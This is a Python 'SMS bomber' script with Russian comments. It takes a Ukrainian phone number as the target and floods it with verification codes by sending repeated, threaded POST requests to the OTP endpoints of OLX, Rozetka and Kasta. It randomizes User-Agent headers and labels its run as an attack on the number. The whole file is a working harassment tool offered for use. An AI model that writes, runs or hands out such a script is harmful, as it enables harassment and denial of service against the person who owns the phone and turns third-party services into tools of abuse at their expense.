import requests
import threading
import time
import random

# Конфигурация актуальных украинских сервисов
SERVICES = [
    {
        'name': 'OLX',
        'url': 'https://www.olx.ua/api/open/oauth/authorize/',
        'data': {'phone': '', 'language': 'uk'},
        'method': 'POST'
    },
    {
        'name': 'Rozetka',
        'url': 'https://rozetka.com.ua/api/identity/sendverificationcode',
        'data': {'phone': '', 'channel': 'SMS'},
        'method': 'POST'
    },
    {
        'name': 'Kasta',
        'url': 'https://kasta.ua/api/auth/request-otp',
        'data': {'phone': '', 'type': 'phone'},
        'method': 'POST'
    }
]

# Генерация случайных заголовков
def get_headers():
    return {
        'User-Agent': random.choice([
            'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'
        ]),
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    }

def send_sms(service, phone):
    try:
        service_data = service.copy()
        # Подставляем номер телефона
        if isinstance(service_data['data'], dict):
            for key in service_data['data']:
                if 'phone' in key:
                    service_data['data'][key] = phone
        
        response = requests.request(
            method=service_data['method'],
            url=service_data['url'],
            json=service_data['data'],
            headers=get_headers(),
            timeout=10
        )
        
        print(f"[+] {service['name']}: {response.status_code}")
        
    except Exception as e:
        print(f"[-] {service['name']}: {e}")

def bomber_start(phone, cycles=10, delay=2):
    print(f"[SWILL] Атака на номер: {phone}")
    
    for cycle in range(cycles):
        print(f"\n[+] Цикл {cycle + 1}/{cycles}")
        
        threads = []
        for service in SERVICES:
            thread = threading.Thread(
                target=send_sms,
                args=(service, phone)
            )
            threads.append(thread)
            thread.start()
            time.sleep(0.5)  # Задержка между запросами
        
        for thread in threads:
            thread.join()
        
        time.sleep(delay)  # Задержка между циклами

if __name__ == "__main__":
    target_phone = input("Введите номер телефона (380XXXXXXXXX): ")
    
    if not target_phone.startswith('380') or len(target_phone) != 12:
        print("Неверный формат номера")
        exit()
    
    cycles = int(input("Количество циклов (default 10): ") or "10")
    delay = int(input("Задержка между циклами в секундах (default 2): ") or "2")
    
    bomber_start(target_phone, cycles, delay)
